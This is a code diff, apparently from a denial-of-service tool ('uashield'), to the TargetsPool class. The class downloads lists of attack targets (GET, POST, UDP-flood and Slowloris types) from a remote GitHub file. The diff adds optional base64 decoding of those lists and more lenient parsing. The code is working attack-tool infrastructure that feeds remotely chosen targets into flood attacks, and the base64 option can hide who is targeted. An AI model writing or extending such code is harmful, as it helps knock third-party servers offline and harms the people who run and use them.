@@ -75,10 +75,11 @@ export type Target = GetTarget | PostTarget | UDPFloodTarget | SlowLorisTarget |
 const SOURCES_URL = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/target_sources.json'
 interface Source {
   url: string
+  type?: "raw" | "base64"
 }
 
 export class TargetsPool {
-  protected sources: string[]
+  protected sources: Source[]
   protected targets: Target[]
 
   private axiosClient: Axios
@@ -113,7 +114,7 @@ export class TargetsPool {
         console.warn(`Failed to load list of external targets resources. Status code: [${sourcesResponse.status}]`)
         return
       }
-      this.sources = sourcesResponse.data.map((s) => s.url)
+      this.sources = sourcesResponse.data
     } catch (e) {
       const code = (e as AxiosError).code
       const statusString = (code !== undefined) ? code : String(e).toString()
@@ -122,18 +123,18 @@ export class TargetsPool {
 
     // Load proxyes from each resource
     const loadedTargetsList = [] as Target[]
-    for (const url of this.sources) {
-      const targets = await this.loadFromURL(url)
-      if (typeof targets === 'string') {
-        console.warn(targets)
-      } else {
-        // if method is invalid or missing - fallback to get
+    for (const source of this.sources) {
+      try {
+        const targets = await this.loadFromSource(source)
+        if (!Array.isArray(targets)) {
+          throw new Error("Loaded targets are not array.")
+        }
         targets.forEach((t) => {
-          if (!targetMethods.includes(t.method)) {
-            t.method = 'get'
-          }
+          t.method = t.method || 'get'
         })
         loadedTargetsList.push(...targets)
+      } catch (e) {
+        console.warn(`Failed to load targets from ${source.url}. Error: ${e}`)
       }
     }
 
@@ -146,26 +147,32 @@ export class TargetsPool {
   }
 
   /**
-   * Load targets list from the URL
+   * Load targets list from the source
    *
-   * @param url where to make request
+   * @param source where to load
    */
-  protected async loadFromURL (url: string) : Promise<Array<Target> | string> {
-    let targets = [] as Target[]
-
-    // Get list from the external source
+  protected async loadFromSource (source: Source) : Promise<Target[]> {
+    let loadedRawData = ""
     try {
-      const response: AxiosResponse<Array<Target>> = await this.axiosClient.get(url, { timeout: 30000, validateStatus: () => true })
-      if (response.status !== 200) {
-        return `Server returned bad status code: ${response.status}`
-      }
-      targets = response.data
+      const response: AxiosResponse<string> = await this.axiosClient.get(source.url, { timeout: 30000, responseType: 'text', transformResponse: (r) => r })
+      loadedRawData = response.data
     } catch (e) {
-      const code = (e as AxiosError).code
-      return (code !== undefined) ? code : String(e).toString()
+      throw new Error(`Failed to load source due to error: ${e}`)
     }
 
-    return targets
+    if (source.type === 'base64') {
+      try {
+        loadedRawData = Buffer.from(loadedRawData, 'base64').toString('utf8')
+      } catch (e) {
+        throw new Error(`Failed to decode base64 data. Error: ${e}`)
+      }
+    }
+
+    try {
+      return JSON.parse(loadedRawData) as Target[]
+    } catch (e) {
+      throw new Error(`Failed to load received data as JSON. Error: ${e}`)
+    }
   }
 
   deleteTarget (target: Target) : void {
